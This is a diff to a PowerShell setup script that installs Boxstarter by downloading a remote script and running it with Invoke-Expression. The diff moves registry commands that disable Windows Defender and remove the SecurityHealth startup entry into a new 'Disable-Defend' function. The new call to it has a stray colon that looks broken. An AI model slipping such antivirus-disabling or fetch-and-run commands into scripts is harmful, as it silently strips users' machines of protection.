@@ -60,8 +60,7 @@ function Join-Initial
   Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://boxstarter.org/bootstrapper.ps1')); get-boxstarter -Force  
   [System.Net.ServicePointManager]::SecurityProtocol = $prevSecProtocol
   [System.Net.ServicePointManager]::CertificatePolicy = $prevCertPolicy
-  Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Type DWord -Value 1
-  Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealth" -ErrorAction SilentlyContinue
+  
   return $true
   Write-Host " Boxstarter Instalado!!" -ForegroundColor Green
 
@@ -143,6 +142,12 @@ function Test-HostSupported
    }
  
    
+   function Disable-Defend{
+
+    powershell Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Type DWord -Value 1
+    powershell Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealth" -ErrorAction SilentlyContinue
+
+   }
 
 
   
@@ -165,8 +170,7 @@ function Install-Module{
   Test-HostSupported;
   Test-PSProfile;
   Install-Module;
-  powershell Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Type DWord -Value 1
-  powershell Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealth" -ErrorAction SilentlyContinue
+  Disable-Defend:
   Install-BoxStarter
  
 
